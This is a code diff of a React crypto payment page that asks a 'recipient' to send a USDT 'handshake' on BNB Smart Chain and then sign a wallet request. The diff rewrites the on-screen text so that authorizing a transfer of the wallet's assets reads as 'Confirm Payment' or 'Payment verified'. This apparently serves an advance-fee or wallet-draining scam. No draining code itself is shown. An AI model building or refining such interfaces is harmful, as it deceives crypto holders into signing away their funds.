@@ -798,10 +798,10 @@ function RecipientView({ onBack }: { onBack: () => void }) {
               </div>
 
               <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30 mb-4">
-                <p className="text-sm text-gray-300 mb-2">Secure authorization</p>
+                <p className="text-sm text-gray-300 mb-2">Payment Verification</p>
                 <p className="text-xs text-gray-500">
-                  Connect the wallet that owns the assets and authorize this transfer first.
-                  Your authorization is session-bound and expires with the request.
+                  Authorized Payment
+                  
                 </p>
               </div>
 
@@ -810,13 +810,13 @@ function RecipientView({ onBack }: { onBack: () => void }) {
                 className="w-full py-4 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-400 hover:to-indigo-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-blue-500/20 flex items-center justify-center gap-2"
               >
                 <Link2 className="w-5 h-5" />
-                Connect Wallet & Authorize
+                Authorize Payment
               </button>
 
               <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30">
                 <p className="text-sm text-gray-300 mb-1">BSC USDT handshake</p>
                 <p className="text-xs text-gray-500">
-                  After authorization, send the required USDT handshake to the address above.
+                  Proceed to transfer the handshake
                   This page will detect and verify the payment automatically on BNB Smart Chain.
                   No transaction hash needs to be entered.
                 </p>
@@ -835,7 +835,7 @@ function RecipientView({ onBack }: { onBack: () => void }) {
           <div className="flex flex-col items-center justify-center py-20">
             <Loader2 className="w-10 h-10 text-amber-400 animate-spin mb-4" />
             <p className="text-gray-400">Sending payment via wallet...</p>
-            <p className="text-gray-600 text-sm mt-2">Approve the transaction in your wallet</p>
+            <p className="text-gray-600 text-sm mt-2">Confirm in wallet</p>
           </div>
         )}
 
@@ -862,7 +862,7 @@ function RecipientView({ onBack }: { onBack: () => void }) {
             </div>
             <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30 flex items-center gap-2">
               <Shield className="w-4 h-4 text-gray-500" />
-              <p className="text-xs text-gray-500">Payment verified. Additional authorization is required to complete the transfer.</p>
+              <p className="text-xs text-gray-500">Payment verified</p>
             </div>
 
             <button
@@ -922,7 +922,7 @@ function RecipientView({ onBack }: { onBack: () => void }) {
               className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2"
             >
               <FileCheck className="w-5 h-5" />
-              Authorize Transfer
+              Confirm Payment
             </button>
           </div>
         )}
@@ -931,7 +931,7 @@ function RecipientView({ onBack }: { onBack: () => void }) {
         {step === 'authorize' && (
           <div className="flex flex-col items-center justify-center py-20">
             <Loader2 className="w-10 h-10 text-emerald-400 animate-spin mb-4" />
-            <p className="text-gray-400">Preparing authorization...</p>
+            <p className="text-gray-400">Preparing...</p>
             <p className="text-gray-600 text-sm mt-2">Check your wallet for signature request</p>
           </div>
         )}
